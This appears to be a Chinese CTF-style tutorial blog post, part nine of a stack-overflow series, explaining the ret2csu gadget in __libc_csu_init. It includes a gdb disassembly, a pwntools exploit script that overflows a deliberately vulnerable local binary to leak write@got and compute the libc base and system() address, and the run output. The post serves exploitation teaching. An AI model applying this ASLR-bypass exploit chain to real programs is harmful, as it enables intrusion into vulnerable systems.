@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>二进制安全之栈溢出（九） - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="二进制安全之栈溢出（九） - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/784/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>二进制安全之栈溢出（九）</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2017-10-28 12:46"><i class="iconfont icon-date"></i>2017-10-28 12:46</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>本篇的代码和之前的略有修改，diff 是这样的。</p>
+
+<div class="language-diff highlighter-rouge"><pre class="highlight"><code>26c26
+&lt;         write(1, "You Are Naive.\n", 15);
+---
+&gt;         printf("You Are Naive.\n");
+</code></pre>
+</div>
+
+<p>其实是为了强行构造漏洞… 编译参数为 <code class="highlighter-rouge">gcc -g -O0 -fno-stack-protector -o vuln main.c</code>，需要开启 aslr。</p>
+
+<h3 id="通用-gadget">通用 gadget</h3>
+
+<p>之前为了构造 gadget 我们使用工具去二进制文件和 libc 中寻找比较明显的，但是可能存在的两个问题</p>
+
+<ul>
+  <li>有些 gadget 不是太明显，需要经过很多步骤的初始化才能得到</li>
+  <li>在开启了 aslr 的情况下，libc 基址并不知道，libc 中的 gadget 使用比较困难</li>
+</ul>
+
+<p>其实在使用了 libc 的二进制程序中，基本上都有一段最多可以写三个参数寄存器的通用 gadget，就在函数 <code class="highlighter-rouge">__libc_csu_init</code> 中。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ pdisas __libc_csu_init
+Dump of assembler code for function __libc_csu_init:
+   0x00000000004007e0 &lt;+0&gt;:	push   r15
+   0x00000000004007e2 &lt;+2&gt;:	push   r14
+   0x00000000004007e4 &lt;+4&gt;:	mov    r15d,edi
+   0x00000000004007e7 &lt;+7&gt;:	push   r13
+   0x00000000004007e9 &lt;+9&gt;:	push   r12
+   0x00000000004007eb &lt;+11&gt;:	lea    r12,[rip+0x20061e]        # 0x600e10
+   0x00000000004007f2 &lt;+18&gt;:	push   rbp
+   0x00000000004007f3 &lt;+19&gt;:	lea    rbp,[rip+0x20061e]        # 0x600e18
+   0x00000000004007fa &lt;+26&gt;:	push   rbx
+   0x00000000004007fb &lt;+27&gt;:	mov    r14,rsi
+   0x00000000004007fe &lt;+30&gt;:	mov    r13,rdx
+   0x0000000000400801 &lt;+33&gt;:	sub    rbp,r12
+   0x0000000000400804 &lt;+36&gt;:	sub    rsp,0x8
+   0x0000000000400808 &lt;+40&gt;:	sar    rbp,0x3
+   0x000000000040080c &lt;+44&gt;:	call   0x400540 &lt;_init&gt;
+   0x0000000000400811 &lt;+49&gt;:	test   rbp,rbp
+   0x0000000000400814 &lt;+52&gt;:	je     0x400836 &lt;__libc_csu_init+86&gt;
+   0x0000000000400816 &lt;+54&gt;:	xor    ebx,ebx
+   0x0000000000400818 &lt;+56&gt;:	nop    DWORD PTR [rax+rax*1+0x0]
+   0x0000000000400820 &lt;+64&gt;:	mov    rdx,r13
+   0x0000000000400823 &lt;+67&gt;:	mov    rsi,r14
+   0x0000000000400826 &lt;+70&gt;:	mov    edi,r15d
+   0x0000000000400829 &lt;+73&gt;:	call   QWORD PTR [r12+rbx*8]
+   0x000000000040082d &lt;+77&gt;:	add    rbx,0x1
+   0x0000000000400831 &lt;+81&gt;:	cmp    rbx,rbp
+   0x0000000000400834 &lt;+84&gt;:	jne    0x400820 &lt;__libc_csu_init+64&gt;
+   0x0000000000400836 &lt;+86&gt;:	add    rsp,0x8
+   0x000000000040083a &lt;+90&gt;:	pop    rbx
+   0x000000000040083b &lt;+91&gt;:	pop    rbp
+   0x000000000040083c &lt;+92&gt;:	pop    r12
+   0x000000000040083e &lt;+94&gt;:	pop    r13
+   0x0000000000400840 &lt;+96&gt;:	pop    r14
+   0x0000000000400842 &lt;+98&gt;:	pop    r15
+   0x0000000000400844 &lt;+100&gt;:	ret
+End of assembler dump.
+</code></pre>
+</div>
+
+<p>这个 gadget 的流程是这样的</p>
+
+<p><img src="https://storage.virusdefender.net/blog/images/784/1.jpg" alt="" /></p>
+
+<h3 id="利用">利用</h3>
+
+<p>如果看懂了上面的图，那很容易就可以使用这个 gadget，下面是一个泄露 libc 基地址的 shellcode</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c"># coding=utf-8</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">student</span> <span class="o">=</span> <span class="mh">0x7fffffffe2f0</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>
+<span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"write"</span><span class="p">]</span>
+<span class="c"># 这个 gadget 就是读取 write@got 的地址</span>
+<span class="c">#        rbx      rbp      r12              r13      r14              r15      second gadget</span>
+<span class="n">gadget</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400820</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"1925</span><span class="se">\n</span><span class="s">"</span>
+<span class="c"># 偏移量和开启 aslr 没关系，这里的硬编码的是偏移量而不是地址</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x7fffffffe348</span> <span class="o">-</span> <span class="n">student</span><span class="p">)</span>
+<span class="c"># gadget start addr -&gt; return addr</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40083a</span><span class="p">)</span>
+
+<span class="n">proc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="nb">raw_input</span><span class="p">()</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Second Here.</span><span class="se">\n</span><span class="s">"</span><span class="p">))</span>
+<span class="c"># 读取到了 write@got 的地址</span>
+<span class="n">write_plt</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"write@got addr "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_plt</span><span class="p">))</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_plt</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"write"</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"libc base addr "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"system addr "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+</code></pre>
+</div>
+
+<p>运行结果是</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>➜  new python shellcode.py
+[*] '/home/virusdefender/Desktop/pwn/new/vuln'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process './vuln': pid 9907
+
+What's Your Birth?
+What's Your Name?
+You Are Born In 1094795585
+You Are Naive.
+You Spend One Second Here.
+
+('write@got addr ', '0x7f4314f8d280')
+[*] '/lib/x86_64-linux-gnu/libc-2.23.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+('libc base addr ', '0x7f4314e96000')
+('system addr ', '0x7f4314edb390')
+</code></pre>
+</div>
+
+<p><code class="highlighter-rouge">vmmap</code> 的结果如下，可以看到和 shellcode 的输出一致。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r-xp	/home/virusdefender/Desktop/pwn/new/vuln
+0x00600000         0x00601000         r--p	/home/virusdefender/Desktop/pwn/new/vuln
+0x00601000         0x00602000         rw-p	/home/virusdefender/Desktop/pwn/new/vuln
+0x01754000         0x01775000         rw-p	[heap]
+0x00007f4314e96000 0x00007f4315056000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f4315056000 0x00007f4315256000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f4315256000 0x00007f431525a000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f431525a000 0x00007f431525c000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f431525c000 0x00007f4315260000 rw-p	mapped
+0x00007f4315260000 0x00007f4315286000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f4315466000 0x00007f4315469000 rw-p	mapped
+0x00007f4315483000 0x00007f4315485000 rw-p	mapped
+0x00007f4315485000 0x00007f4315486000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f4315486000 0x00007f4315487000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f4315487000 0x00007f4315488000 rw-p	mapped
+0x00007ffc9b5d9000 0x00007ffc9b5fa000 rw-p	[stack]
+0x00007ffc9b5fb000 0x00007ffc9b5fd000 r--p	[vvar]
+0x00007ffc9b5fd000 0x00007ffc9b5ff000 r-xp	[vdso]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+</code></pre>
+</div>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=二进制安全之栈溢出（九）&article_id=/index.php/archives/784/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
